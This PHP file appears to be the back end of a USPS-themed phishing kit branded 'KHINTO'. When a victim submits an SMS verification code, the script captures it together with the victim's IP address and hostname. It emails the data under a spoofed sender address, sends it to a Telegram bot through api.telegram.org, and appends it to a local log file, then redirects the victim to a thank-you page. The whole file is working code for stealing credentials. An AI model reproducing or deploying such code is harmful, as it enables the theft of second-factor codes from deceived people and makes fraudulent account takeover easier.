<?php

error_reporting(0);
session_start();
include "../../email.php";
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(
	($_POST['sms1'] != "") )
{
$hostname = gethostbyaddr($ip);
$message = "[========== ♠️ ⚡ KHINTO USPS RZLT(SMS2) ⚡ ♠️ ===========]\r\n";
$message .= "|SMS2 		 : ".$_POST['sms1']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email; 
$subject = "♠️ (".$_SESSION["name"].") SMS2 USPS RZLT ♠️ $ip";
$headers = "From: [KHINTO **]<info@arduino.com>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../../KHINTO.txt","a+");
fwrite($save,$message);
fclose($save);
include "../files/oldusps.gif";

echo"<script>location.replace('../thanks.php');</script>";
}else{echo"error sending";}

?>
